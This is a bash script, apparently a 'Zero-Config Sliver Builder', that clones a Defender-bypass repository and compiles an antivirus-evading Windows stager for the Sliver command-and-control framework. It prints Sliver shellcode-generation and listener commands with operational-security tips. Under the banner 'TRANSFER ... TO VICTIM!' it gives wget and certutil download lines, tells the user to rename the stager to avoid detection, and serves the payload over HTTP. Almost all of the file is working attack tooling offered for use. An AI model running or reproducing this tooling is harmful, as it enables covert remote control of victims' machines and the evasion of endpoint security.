#!/bin/bash

# --- Configuration & Styling ---
REPO_URL="https://github.com/TeneBrae93/defender_bypass_with_sliver.git"
TARGET_DIR="$HOME/defender_bypass_with_sliver"
DIR_NAME="defender_bypass_with_sliver"

YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\e[0;34m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# 1. Dependency Checks
for tool in git python3 sed; do
    if ! command -v "$tool" &>/dev/null; then
        echo -e "${RED}[!] Error: $tool is not installed.${NC}"
        exit 1
    fi
done

# 2. Directory & Repo Handling (Avoids self-moving script issues)
if [ ! -d "$TARGET_DIR" ]; then
    echo -e "${CYAN}[*] Cloning repository into $TARGET_DIR...${NC}"
    git clone "$REPO_URL" "$TARGET_DIR" || { echo -e "${RED}[!] Git clone failed.${NC}"; exit 1; }
fi

cd "$TARGET_DIR" || exit 1

# 3. User Input & Validation
echo -e "${YELLOW}------------------------------------------------------------${NC}"
echo -e "${GREEN}                 Zero-Config Sliver Builder${NC}"
echo -e "${YELLOW}------------------------------------------------------------${NC}"

read -p "[?] Enter Hosting IP: " LHOST
read -p "[?] Enter Hosting Port: " LPORT
read -p "[?] Enter Sliver Listener Port: " SLIVER_PORT
read -p "[?] Enter Shellcode filename (e.g., payload.bin): " RAW_BIN
read -p "[?] Enter Final EXE name (e.g., stager.exe): " RAW_EXE

# Fallback defaults if blank
LHOST="${LHOST:-127.0.0.1}"
LPORT="${LPORT:-8000}"
SLIVER_PORT="${SLIVER_PORT:-8888}"
RAW_BIN="${RAW_BIN:-shellc.bin}"
RAW_EXE="${RAW_EXE:-stager.exe}"

BIN_NAME="${RAW_BIN%.bin}.bin"
EXE_NAME="${RAW_EXE%.exe}.exe"

# 4. Check for builder.py
if [ ! -f "builder.py" ]; then
    echo -e "${RED}[!] Error: builder.py not found in $TARGET_DIR${NC}"
    exit 1
fi

# Reset builder.py to original state to prevent sed stacking
git checkout builder.py 2>/dev/null

# Update builder.py safely
sed -i "s/shellc.bin/$BIN_NAME/g" builder.py

# 5. Check for Shellcode file before building
if [ ! -f "$BIN_NAME" ]; then
    echo -e "\n${YELLOW}[!] Warning: $BIN_NAME not found in $TARGET_DIR.${NC}"
    echo -e "\n${CYAN}[*] Generate it in Sliver console using:${NC}"
    echo -e "\n    generate --mtls $LHOST:$SLIVER_PORT --os windows --arch amd64 --format shellcode --save ~/$DIR_NAME/$BIN_NAME\n"
    read -p "[?] Press Enter once $BIN_NAME is placed in this directory..."
fi

# 6. Run the Builder (Capturing errors if it fails)
echo -e "\n${CYAN}[*] Compiling stager...${NC}"
BUILD_LOG=$(mktemp)
if python3 builder.py -l "$LHOST" -p "$LPORT" > "$BUILD_LOG" 2>&1; then
    if [ -f "stager.exe" ]; then
        mv stager.exe "$EXE_NAME"
        echo -e "\n${YELLOW}============================================================${NC}"
        echo -e "${GREEN}            [SUCCESS] $EXE_NAME generated!${NC}"
        echo -e "${YELLOW}============================================================${NC}"
        
        echo -e "\n${YELLOW}[!] Sliver Listener command:${NC}"
        echo -e "\n    mtls -L $LHOST -l $SLIVER_PORT  <- ${GREEN}BETTER OPSEC${NC}"
        echo -e "    mtls -l $SLIVER_PORT <- ${BLUE}(v)NICs PORT EXPOSED${NC}"
        echo -e "    http -L $LHOST -l $SLIVER_PORT  <- ${RED}NOT SECURE${NC}"

        read -p $'\n[?] Press Enter once Sliver Listener is active...'

        echo -e "\n${YELLOW}============================================================${NC}"
        echo -e "${GREEN}            TRANSFER $EXE_NAME TO VICTIM!${NC}"
        echo -e "${YELLOW}============================================================${NC}"
        
        echo -e "\n    wget http://$LHOST:$LPORT/$EXE_NAME -o <NEW_EXE_NAME>"
        echo -e "\n    certutil.exe -urlcache -split -f http://$LHOST/$LPORT/$EXE_NAME <NEW_EXE_NAME>"

        echo -e "\n${YELLOW}[!] Renaming the stager.exe is required!${NC}"

        echo -e "\n${CYAN}[*] Starting HTTP server on port $LPORT...${NC}"
        echo -e "\n${YELLOW}[!] Press Ctrl+C to stop the server.${NC}"
        python3 -m http.server "$LPORT"
    else
        echo -e "\n${RED}[!] Error: stager.exe was not created.${NC}"
        cat "$BUILD_LOG"
    fi
else
    echo -e "\n${RED}[!] Error: compilation failed. Output log:${NC}"
    cat "$BUILD_LOG"
fi
rm -f "$BUILD_LOG"
